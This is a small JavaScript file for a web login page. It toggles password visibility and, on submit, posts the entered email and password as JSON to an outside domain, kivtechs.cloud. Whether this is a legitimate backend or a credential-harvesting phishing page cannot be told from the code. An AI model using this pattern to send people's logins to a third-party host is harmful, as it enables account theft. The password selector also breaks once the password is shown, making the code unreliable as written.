/*=============== SHOW HIDDEN - PASSWORD ===============*/
const showHiddenPass = (loginPass, loginEye) => {
	const input = document.getElementById(loginPass),
		iconEye = document.getElementById(loginEye);

	iconEye.addEventListener("click", () => {
		// Change password to text
		if (input.type === "password") {
			// Switch to text
			input.type = "text";

			// Icon change
			iconEye.classList.add("ri-eye-line");
			iconEye.classList.remove("ri-eye-off-line");
		} else {
			// Change to password
			input.type = "password";

			// Icon change
			iconEye.classList.remove("ri-eye-line");
			iconEye.classList.add("ri-eye-off-line");
		}
	});
};

showHiddenPass("login-pass", "login-eye");

/*=============== POST LOGIN DATA ===============*/
const loginForm = document.querySelector(".login__form");

loginForm.addEventListener("submit", (e) => {
	e.preventDefault(); // Prevent form submission

	// Get the values from the form inputs
	const email = document.querySelector(".login__input[type='email']").value;
	const password = document.querySelector(".login__input[type='password']").value;

	// Create an object with the login data
	const loginData = {
		email: email,
		password: password
	};

	// Post the login data to the endpoint
	fetch("https://kivtechs.cloud/", {
		method: "POST",
		headers: {
			"Content-Type": "application/json"
		},
		body: JSON.stringify(loginData)
	})
		.then(response => response.json())
		.then(data => {
			// Handle the response from the server
			console.log(data);
			// Redirect to a new page or perform other actions based on the response
		})
		.catch(error => {
			// Handle any errors that occur during the request
			console.error(error);
		});
});
